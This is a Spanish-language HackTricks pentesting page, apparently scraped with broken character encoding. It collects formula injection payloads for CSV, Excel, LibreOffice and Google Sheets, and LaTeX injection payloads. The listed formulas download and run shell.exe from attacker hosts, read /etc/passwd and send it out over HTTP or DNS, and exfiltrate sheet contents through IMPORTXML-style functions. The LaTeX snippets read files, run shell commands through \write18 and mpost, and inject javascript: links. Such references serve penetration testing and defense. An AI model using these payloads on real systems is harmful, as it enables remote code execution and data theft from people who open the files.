# Inyecci√≥n de F√≥rmulas/CSV/Doc/LaTeX

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Inyecci√≥n de F√≥rmulas

### Informaci√≥n

Si tu **entrada** est√° siendo **reflejada** dentro de **archivos CSV** (o cualquier otro archivo que probablemente se abrir√° en **Excel**), es posible que puedas poner **f√≥rmulas de Excel** que se **ejecutar√°n** cuando el usuario **abra el archivo** o cuando el usuario **haga clic en alg√∫n enlace** dentro de la hoja de Excel.

{% hint style="danger" %}
Hoy en d√≠a, **Excel alertar√°** (varias veces) al **usuario cuando algo se cargue desde fuera de Excel** para evitar que realice acciones maliciosas. Por lo tanto, se debe aplicar un esfuerzo especial en la ingenier√≠a social para la carga final.
{% endhint %}

### [Lista de palabras](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperv√≠nculo

**El siguiente ejemplo es muy √∫til para exfiltrar contenido de la hoja de c√°lculo final y realizar solicitudes a ubicaciones arbitrarias. Pero requiere que el usuario haga clic en el enlace (y acepte las advertencias).**

Ejemplo tomado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Supongamos un escenario de ataque al sistema de gesti√≥n de registros de estudiantes de una escuela. La aplicaci√≥n permite al profesor ingresar detalles de los estudiantes en la escuela. El atacante obtiene acceso a la aplicaci√≥n y quiere que todos los profesores que usan la aplicaci√≥n se vean comprometidos. Entonces, el atacante intenta realizar un ataque de inyecci√≥n CSV a trav√©s de la aplicaci√≥n web.\
El atacante necesita robar los detalles de otros estudiantes. Entonces, el atacante usa la f√≥rmula de hiperv√≠nculo y la ingresa mientras ingresa los detalles del estudiante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Cuando el profesor exporta el CSV y hace clic en el hiperv√≠nculo, los datos sensibles se env√≠an al servidor del atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

El archivo CSV exportado contiene carga maliciosa en √©l.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Los detalles del estudiante se registran en el servidor web del atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Para que este ejemplo funcione, es **necesario habilitar la siguiente configuraci√≥n**:\
Archivo ‚Üí Opciones ‚Üí Centro de confianza ‚Üí Configuraci√≥n del Centro de confianza ‚Üí Contenido externo ‚Üí Habilitar el lanzamiento del servidor de intercambio din√°mico de datos\
o el uso de una **versi√≥n antigua de Excel**.

La buena noticia es que **esta carga √∫til se ejecuta autom√°ticamente cuando se abre el archivo** (si el usuario acepta las advertencias).

Es posible ejecutar una calculadora con la siguiente carga √∫til **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (3).png>)

### M√°s
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Esto leer√° la primera l√≠nea del archivo local /etc/passwd: `='file:///etc/passwd'#$passwd.A1`
* Exfiltrarla: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrar m√°s de una l√≠nea: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltraci√≥n de DNS: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analizando la carga de exfiltraci√≥n de DNS:**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Leer√° la 19¬™ l√≠nea del archivo local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì Codifica en URL los datos devueltos
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Similar a substring, lee datos desde el primer car√°cter hasta el 41¬∫ ‚Äì una forma muy √∫til de restringir la longitud de los nombres de host DNS (l√≠mite de 254 caracteres en FQDN y 63 caracteres para una etiqueta, es decir, subdominio)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì reemplaza todas las instancias de % (el car√°cter especial de la codificaci√≥n URL) con gui√≥n ‚Äì esto asegura que solo se usen caracteres DNS v√°lidos
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) ‚Äì Concatena la salida del archivo (despu√©s de que se haya realizado el procesamiento anterior) con el FQDN (para el cual tenemos acceso al host que es autoritario para el dominio)
* WEBSERVICE ‚Äì Realizar√° una solicitud para este nombre DNS inexistente que luego podemos analizar los registros (o ejecutar tcpdump, etc.) en el servidor de nombres autoritario DNS para el cual tenemos control

### Google Sheets OOB Data Exfiltration

En primer lugar, presentemos algunas de las funciones m√°s interesantes.

**CONCATENATE**: A√±ade cadenas una a otra.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: Importa datos de varios tipos de datos estructurados, incluyendo XML, HTML, CSV, TSV y fuentes de ATOM y RSS XML.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: Importa un feed RSS o ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: Importa datos de una tabla o lista dentro de una p√°gina HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: Importa un rango de celdas de una hoja de c√°lculo especificada.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGEN**: Inserta una imagen en una celda.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Inyecci√≥n de LaTeX

Por lo general, los servidores que se encuentran en Internet que **convierten c√≥digo LaTeX a PDF** utilizan **`pdflatex`**. Este programa utiliza 3 atributos principales para permitir o no la ejecuci√≥n de comandos:

* **`--no-shell-escape`**: **Desactiva** la construcci√≥n `\write18{command}`, incluso si est√° habilitada en el archivo texmf.cnf.
* **`--shell-restricted`**: Lo mismo que `--shell-escape`, pero **limitado** a un conjunto 'seguro' de \*\*comandos predefinidos (\*\*En Ubuntu 16.04, la lista se encuentra en `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** la construcci√≥n `\write18{command}`. El comando puede ser cualquier comando de shell. Esta construcci√≥n normalmente est√° desactivada por razones de seguridad.

Sin embargo, existen otras formas de ejecutar comandos, por lo que para evitar RCE es muy importante usar `--shell-restricted`.

### Leer archivo <a href="#read-file" id="read-file"></a>
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Leer archivo de una sola l√≠nea
```bash
ewread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Leer archivo de varias l√≠neas
```bash
ewread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```
### Escribir archivo <a href="#write-file" id="write-file"></a>
```bash
ewwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ejecuci√≥n de comandos <a href="#command-execution" id="command-execution"></a>

La entrada del comando se redirigir√° a stdin, utiliza un archivo temporal para obtenerla.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si obtienes alg√∫n error de LaTex, considera usar base64 para obtener el resultado sin caracteres incorrectos.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Desde [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Referencias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
